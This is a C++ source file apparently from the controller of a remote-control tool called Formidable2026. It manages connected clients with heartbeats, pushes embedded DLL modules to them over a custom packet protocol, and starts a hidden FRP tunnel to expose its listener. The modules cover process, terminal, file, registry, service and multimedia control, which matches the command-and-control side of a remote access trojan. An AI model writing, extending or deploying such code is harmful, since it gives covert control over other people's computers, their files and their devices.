/**
 * NetworkHelper.cpp - 网络和模块发送功能
 * Encoding: UTF-8 BOM
 */
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>

#include "NetworkHelper.h"
#include "GlobalState.h"
#include "StringUtils.h"
#include "MainWindow.h"
#include "Core/CommandHandler.h"
#include "resource.h"
#include <vector>
#include <fstream>
#include <iostream>
#include <string>
#include "../Common/Utils.h"
#include "Utils/StringHelper.h"

using namespace Formidable;
using namespace Formidable::Utils;

// 工具函数 - 从资源加载数据
bool GetResourceData(int resourceId, std::vector<char>& buffer) {
    HRSRC hRes = FindResourceW(g_hInstance, MAKEINTRESOURCEW(resourceId), L"BIN");
    if (!hRes) return false;
    HGLOBAL hData = LoadResource(g_hInstance, hRes);
    if (!hData) return false;
    DWORD size = SizeofResource(g_hInstance, hRes);
    char* data = (char*)LockResource(hData);
    if (!data) return false;
    buffer.assign(data, data + size);
    return true;
}

int GetResourceIdFromDllName(const std::wstring& dllName, bool is64Bit) {
    if (is64Bit) {
        if (dllName == L"ProcessManager.dll") return IDR_MOD_PROCESS_X64;
        if (dllName == L"SystemInfo.dll") return IDR_MOD_SYSTEM_X64;
        if (dllName == L"Terminal.dll") return IDR_MOD_TERMINAL_X64;
        if (dllName == L"WindowManager.dll") return IDR_MOD_WINDOW_X64;
        if (dllName == L"FileManager.dll") return IDR_MOD_FILE_X64;
        if (dllName == L"ServiceManager.dll") return IDR_MOD_SERVICE_X64;
        if (dllName == L"RegistryManager.dll") return IDR_MOD_REGISTRY_X64;
        if (dllName == L"Multimedia.dll") return IDR_MOD_MULTIMEDIA_X64;
    } else {
        if (dllName == L"ProcessManager.dll") return IDR_MOD_PROCESS_X86;
        if (dllName == L"SystemInfo.dll") return IDR_MOD_SYSTEM_X86;
        if (dllName == L"Terminal.dll") return IDR_MOD_TERMINAL_X86;
        if (dllName == L"WindowManager.dll") return IDR_MOD_WINDOW_X86;
        if (dllName == L"FileManager.dll") return IDR_MOD_FILE_X86;
        if (dllName == L"ServiceManager.dll") return IDR_MOD_SERVICE_X86;
        if (dllName == L"RegistryManager.dll") return IDR_MOD_REGISTRY_X86;
        if (dllName == L"Multimedia.dll") return IDR_MOD_MULTIMEDIA_X86;
    }
    return 0;
}

// HPSocket发送数据
bool SendDataToClient(std::shared_ptr<ConnectedClient> client, const void* pData, int iLength) {
    if (!client || !client->active) return false;
    return g_pNetworkServer->Send(client->connId, (const BYTE*)pData, iLength);
}

// 发送模块 DLL
bool SendModuleToClient(uint32_t clientId, uint32_t cmd, const std::wstring& dllName, uint32_t arg2) {
    std::shared_ptr<ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(clientId)) client = g_Clients[clientId];
    }
    if (!client) return false;

    std::vector<char> dllData;
    
    wchar_t szExePath[MAX_PATH];
    GetModuleFileNameW(NULL, szExePath, MAX_PATH);
    std::wstring masterDir = szExePath;
    size_t lastSlash = masterDir.find_last_of(L"\\/");
    masterDir = masterDir.substr(0, lastSlash + 1);

    std::vector<std::wstring> searchPaths;
    bool use64Bit = (client->info.is64Bit != 0); // 使用客户端实际架构
    
    if (use64Bit) {
        searchPaths.push_back(masterDir + L"x64\\" + dllName);
        searchPaths.push_back(masterDir + L"Formidable2026\\x64\\" + dllName);
    } else {
        searchPaths.push_back(masterDir + L"x86\\" + dllName);
        searchPaths.push_back(masterDir + L"Formidable2026\\x86\\" + dllName);
    }
    searchPaths.push_back(masterDir + dllName);

    for (const auto& dllPath : searchPaths) {
        HANDLE hFile = CreateFileW(dllPath.c_str(), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD fileSize = GetFileSize(hFile, NULL);
            if (fileSize > 0) {
                dllData.resize(fileSize);
                DWORD bytesRead;
                if (ReadFile(hFile, dllData.data(), fileSize, &bytesRead, NULL) && bytesRead == fileSize) {
                    AddLog(L"系统", L"加载模块: " + dllName + (use64Bit ? L" (x64)" : L" (x86)"));
                    CloseHandle(hFile);
                    goto data_ready;
                }
            }
            CloseHandle(hFile);
        }
    }

    if (dllData.empty()) {
        int resId = GetResourceIdFromDllName(dllName, use64Bit);
        if (resId == 0) {
            AddLog(L"错误", L"未找到匹配的模块资源: " + dllName);
            return false;
        }
        if (!GetResourceData(resId, dllData)) {
            AddLog(L"错误", L"加载资源失败: " + dllName);
            return false;
        }
    }

data_ready:
    size_t fileSize = dllData.size();
    size_t bodySize = sizeof(Formidable::CommandPkg) + fileSize;
    std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
    
    Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
    memcpy(header->flag, "FRMD26?", 7);
    header->originLen = (int)bodySize;
    header->totalLen = (int)buffer.size();
    Formidable::CommandPkg* pkg = (Formidable::CommandPkg*)(buffer.data() + sizeof(Formidable::PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = (uint32_t)fileSize;
    pkg->arg2 = arg2;
    memcpy(pkg->data, dllData.data(), fileSize);
    return SendDataToClient(client, buffer.data(), (int)buffer.size());
}

bool SendSimpleCommand(uint32_t clientId, uint32_t cmd, uint32_t arg1, uint32_t arg2, const std::string& data) {
    std::shared_ptr<Formidable::ConnectedClient> client;
    {
        std::lock_guard<std::mutex> lock(g_ClientsMutex);
        if (g_Clients.count(clientId)) client = g_Clients[clientId];
    }
    if (!client) return false;
    
    size_t bodySize = sizeof(Formidable::CommandPkg) + data.size();
    std::vector<char> buffer(sizeof(Formidable::PkgHeader) + bodySize);
    Formidable::PkgHeader* header = (Formidable::PkgHeader*)buffer.data();
    memcpy(header->flag, "FRMD26?", 7);
    header->originLen = (int)bodySize;
    header->totalLen = (int)buffer.size();
    Formidable::CommandPkg* pkg = (Formidable::CommandPkg*)(buffer.data() + sizeof(Formidable::PkgHeader));
    pkg->cmd = cmd;
    pkg->arg1 = arg1;
    pkg->arg2 = arg2;
    if (!data.empty()) {
        memcpy(pkg->data, data.data(), data.size());
    }
    return SendDataToClient(client, buffer.data(), (int)buffer.size());
}

// 心跳线程
void HeartbeatThread() {
    while (true) {
        std::map<uint32_t, std::shared_ptr<ConnectedClient>> clientsCopy;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            clientsCopy = g_Clients;
        }
        
        uint64_t now = GetTickCount64();
        for (auto& pair : clientsCopy) {
            auto& client = pair.second;
            if (client->active) {
                // 如果超过 60 秒没有收到心跳响应，认为已断开
                if (client->lastHeartbeat > 0 && (now - client->lastHeartbeat > 60000)) {
                    client->active = false;
                    // 通知 UI 客户端已断开
                    PostMessageW(g_hMainWnd, WM_CLIENT_DISCONNECT, 0, (LPARAM)client->clientId);
                    continue;
                }
                
                client->lastHeartbeatSendTime = now;
                SendSimpleCommand(pair.first, CMD_HEARTBEAT);
            }
        }
        Sleep(5000);
    }
}

// 网络线程
void NetworkThread() {
    g_pNetworkServer = new NetworkServer();
    
    g_pNetworkServer->SetOnConnect([](CONNID connId, const char* ip) {
        auto client = std::make_shared<ConnectedClient>();
        client->connId = connId;
        client->ip = ip;
        // Determine port if possible or set to default
        char szAddr[50];
        int iLen = 50;
        USHORT port = 0;
        if (g_pNetworkServer->GetClientAddress(connId, szAddr, iLen, port)) {
            client->port = port;
        } else {
            client->port = 0;
        }

        client->active = true;
        
        uint32_t clientId;
        {
            std::lock_guard<std::mutex> lock(g_ClientsMutex);
            clientId = g_NextClientId++;
            g_Clients[clientId] = client;
            client->clientId = clientId;
        }
        
        {
            std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
            g_ConnIdToClientId[connId] = clientId;
        }
        
        AddLog(L"连接", ToWString(ip) + L" 已连接");
    });
    
    g_pNetworkServer->SetOnReceive([](CONNID connId, const BYTE* pData, int iLength) {
        AddLog(L"调试", L"OnReceive: connId=" + std::to_wstring(connId) + L", len=" + std::to_wstring(iLength));
        
        uint32_t clientId = 0;
        {
            std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
            auto it = g_ConnIdToClientId.find(connId);
            if (it != g_ConnIdToClientId.end()) {
                clientId = it->second;
            }
        }
        
        if (clientId > 0) {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                if (g_Clients.count(clientId)) client = g_Clients[clientId];
            }
            if (!client) return;

            // 将收到的数据追加到缓冲区
            client->recvBuffer.insert(client->recvBuffer.end(), pData, pData + iLength);

            // 循环处理缓冲区中所有完整的包
            while (client->recvBuffer.size() >= sizeof(Formidable::PkgHeader)) {
                Formidable::PkgHeader* header = (Formidable::PkgHeader*)client->recvBuffer.data();
                
                // 验证包头标志
                if (memcmp(header->flag, "FRMD26?", 7) != 0) {
                    // 非法数据，清空缓冲区并断开
                    client->recvBuffer.clear();
                    g_pNetworkServer->Disconnect(connId);
                    break;
                }

                int totalPkgLen = header->totalLen;
                if (client->recvBuffer.size() >= (size_t)totalPkgLen) {
                    // 提取包体数据
                    const BYTE* pkgBody = client->recvBuffer.data() + sizeof(Formidable::PkgHeader);
                    int bodyLen = header->originLen;

                    // 处理包体数据
                    Formidable::Core::CommandHandler::HandlePacket(clientId, pkgBody, bodyLen);

                    // 从缓冲区移除已处理的数据
                    client->recvBuffer.erase(client->recvBuffer.begin(), client->recvBuffer.begin() + totalPkgLen);
                } else {
                    // 数据包不完整，等待下一次接收
                    break;
                }
            }
        }
    });
    
    g_pNetworkServer->SetOnClose([](CONNID connId) {
        uint32_t clientId = 0;
        {
            std::lock_guard<std::mutex> lock(g_ConnIdMapMutex);
            auto it = g_ConnIdToClientId.find(connId);
            if (it != g_ConnIdToClientId.end()) {
                clientId = it->second;
                g_ConnIdToClientId.erase(it);
            }
        }
        
        if (clientId > 0) {
            std::shared_ptr<ConnectedClient> client;
            {
                std::lock_guard<std::mutex> lock(g_ClientsMutex);
                auto it = g_Clients.find(clientId);
                if (it != g_Clients.end()) {
                    client = it->second;
                    g_Clients.erase(it);
                }
            }
            
            if (client) {
                client->active = false;
                AddLog(L"断开", ToWString(client->ip) + L" 已断开");
                
                // 清理 UI
                // if (client->listIndex >= 0) {
                    // ListView_DeleteItem(g_hListClients, client->listIndex);
                // }
            }
            
            UpdateStatusBar();
        }
    });

    if (!g_pNetworkServer->Start("0.0.0.0", (USHORT)g_Settings.listenPort)) {
        AddLog(L"错误", L"网络服务启动失败，请检查端口是否被占用");
    } else {
        AddLog(L"系统", L"网络服务已启动，监听端口: " + std::to_wstring(g_Settings.listenPort));
        // 启动 FRP
        StartFrp();
    }
}

void StartFrp() {
    if (!g_Settings.bEnableFrp) return;

    // 1. 生成 frpc.toml
    wchar_t szExePath[MAX_PATH];
    GetModuleFileNameW(NULL, szExePath, MAX_PATH);
    std::wstring masterDir = szExePath;
    size_t lastSlash = masterDir.find_last_of(L"\\/");
    if (lastSlash != std::wstring::npos) {
        masterDir = masterDir.substr(0, lastSlash);
    }
    
    std::wstring tomlPath = masterDir + L"\\frpc.toml";
    
    // 使用 std::ofstream 并写入 UTF-8
    std::ofstream tomlFile(tomlPath);
    if (tomlFile.is_open()) {
        tomlFile << "serverAddr = \"" << StringHelper::WideToUTF8(g_Settings.szFrpServer) << "\"" << std::endl;
        tomlFile << "serverPort = " << g_Settings.frpServerPort << std::endl;
        if (wcslen(g_Settings.szFrpToken) > 0) {
            tomlFile << "auth.token = \"" << StringHelper::WideToUTF8(g_Settings.szFrpToken) << "\"" << std::endl;
        }
        tomlFile << std::endl;
        tomlFile << "[[proxies]]" << std::endl;
        tomlFile << "name = \"" << StringHelper::WideToUTF8(g_Settings.szFrpProxyName) << "\"" << std::endl;
        tomlFile << "type = \"tcp\"" << std::endl;
        tomlFile << "localIP = \"127.0.0.1\"" << std::endl;
        tomlFile << "localPort = " << g_Settings.listenPort << std::endl;
        tomlFile << "remotePort = " << g_Settings.frpRemotePort << std::endl;
        tomlFile.close();
    }

    // 2. 启动 frpc.exe
    std::wstring frpcPath = masterDir + L"\\frpc.exe";
    if (GetFileAttributesW(frpcPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
        // 尝试在 thirdparty/Bin 目录下寻找
        frpcPath = masterDir + L"\\thirdparty\\Bin\\frpc.exe";
        if (GetFileAttributesW(frpcPath.c_str()) == INVALID_FILE_ATTRIBUTES) {
            AddLog(L"FRP", L"未找到 frpc.exe，请确保其位于程序目录或 thirdparty\\Bin 下");
            return;
        }
    }

    std::wstring cmd = L"\"" + frpcPath + L"\" -c \"" + tomlPath + L"\"";
    
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (CreateProcessW(NULL, (LPWSTR)cmd.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        AddLog(L"FRP", L"FRP 内网穿透已启动 (端口: " + std::to_wstring(g_Settings.frpRemotePort) + L")");
    } else {
        AddLog(L"FRP", L"FRP 启动失败，错误代码: " + std::to_wstring(GetLastError()));
    }
}

void StopFrp() {
    system("taskkill /F /IM frpc.exe /T > nul 2>&1");
    AddLog(L"FRP", L"FRP 内网穿透已停止");
}